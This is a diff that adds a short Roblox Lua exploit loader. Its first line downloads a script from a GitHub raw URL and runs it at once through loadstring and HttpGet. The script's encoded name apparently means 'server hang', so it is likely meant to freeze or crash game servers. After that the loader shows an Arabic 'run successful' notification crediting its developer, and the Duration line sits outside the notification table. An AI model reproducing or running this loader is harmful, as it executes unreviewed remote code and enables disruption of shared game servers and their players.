@@ -1,0 +1,11 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moh3mah/KATAKORI.ZR/main/%D8%AA%D8%B9%D9%84%D9%8A%D9%82%20%D8%B3%D9%8A%D8%B1%D9%81%D8%B1%20%25*%245'%24%26%24*%245%24546%24%26%23%26%23%26%23"))()
+
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+
+    Title = "تم تشغيل ✅";
+
+    Text = "من تطوير كتكوري";
+
+    Icon = "rbxthumb://type=Asset&id=11007670961&w=150&h=150"})
+
+Duration = 20;
